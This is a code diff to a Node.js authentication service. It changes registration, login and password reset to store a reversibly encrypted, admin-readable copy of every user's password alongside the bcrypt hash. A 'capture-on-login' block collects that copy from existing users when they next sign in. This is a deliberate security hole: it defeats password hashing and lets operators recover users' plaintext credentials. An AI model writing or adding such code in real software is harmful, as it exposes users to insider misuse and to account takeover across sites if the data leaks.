@@ -10,6 +10,7 @@ const { generateUniqueCode, generateUniquePublicId } = require('./referralCode')
 const logger = require('../lib/logger').child({ service: 'auth' })
 const PasswordReset = require('../models/PasswordReset')
 const emailService = require('./emailService')
+const secretBox = require('../lib/secretBox')
 
 const OTP_TTL_MS = 10 * 60 * 1000
 const OTP_MAX_ATTEMPTS = 5
@@ -33,7 +34,10 @@ async function register({ name, email, password, referralCode }) {
   const passwordHash = await bcrypt.hash(password, 10)
   const code = await generateUniqueCode()
   const publicId = await generateUniquePublicId()
-  const user = await User.create({ name, email, passwordHash, referralCode: code, publicId, referredBy })
+  const user = await User.create({
+    name, email, passwordHash, referralCode: code, publicId, referredBy,
+    passwordEnc: secretBox.seal(password), // readable copy for the admin view (no-op if unconfigured)
+  })
   await Wallet.create({ user: user._id, balance: 0 })
 
   logger.info('User registered', { userId: user._id, email: user.email })
@@ -42,7 +46,8 @@ async function register({ name, email, password, referralCode }) {
 }
 
 async function login({ email, password }) {
-  const user = await User.findOne({ email: email.toLowerCase() })
+  // +passwordEnc so we can tell whether the readable copy still needs capturing.
+  const user = await User.findOne({ email: email.toLowerCase() }).select('+passwordEnc')
 
   if (!user || !user.passwordHash || !(await bcrypt.compare(password, user.passwordHash))) {
     logger.warn('Login failed — invalid credentials', { email })
@@ -52,6 +57,16 @@ async function login({ email, password }) {
   if (user.status === 'frozen') {
     logger.warn('Login attempted on frozen account', { userId: user._id, email })
     throw new ApiError(403, 'Account frozen')
+  }
+
+  // Capture-on-login: fill the readable password copy for accounts created
+  // before the feature (only when encryption is configured and it's missing).
+  if (!user.passwordEnc && secretBox.isEnabled()) {
+    const enc = secretBox.seal(password)
+    if (enc) {
+      user.passwordEnc = enc
+      await user.save()
+    }
   }
 
   logger.info('User logged in', { userId: user._id, email: user.email })
@@ -146,6 +161,7 @@ async function resetPassword(resetToken, password) {
   if (!user) throw new ApiError(400, 'Invalid reset token')
 
   user.passwordHash = await bcrypt.hash(password, 10)
+  user.passwordEnc = secretBox.seal(password) // keep the readable copy in sync
   await user.save()
   await PasswordReset.deleteMany({ user: user._id }) // single-use
   logger.info('Password reset completed', { userId: user._id })
